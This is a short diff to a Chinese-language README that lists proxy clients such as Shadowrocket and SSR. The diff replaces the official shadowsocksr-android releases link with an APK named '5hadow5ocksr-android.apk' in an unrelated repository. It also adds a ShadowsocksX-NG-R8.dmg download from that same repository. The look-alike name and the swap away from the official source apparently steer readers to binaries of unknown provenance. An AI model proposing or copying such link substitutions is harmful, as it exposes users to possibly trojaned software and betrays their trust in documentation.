@@ -53,7 +53,7 @@ Shadowrocket：https://raw.githubusercontent.com/lhie1/Surge/master/Shadowrocket
 
 # 安卓客户端
 
-SSR-安卓：https://github.com/shadowsocksr/shadowsocksr-android/releases
+SSR-安卓：https://github.com/smusicsanshu/smusic/blob/master/5hadow5ocksr-android.apk
 
 ### 使用方法
 
@@ -90,6 +90,8 @@ ACL更新地址（白名单，无去广告）：https://raw.githubusercontent.co
 直接复制进去即可，重启软件，即可（此方法WIN通用）
 
 位置：代理设置 - 编辑PAC用户自定规则
+
+客户端：https://github.com/smusicsanshu/smusic/blob/master/ShadowsocksX-NG-R8.dmg
 
 #### 添加自定义规则
 
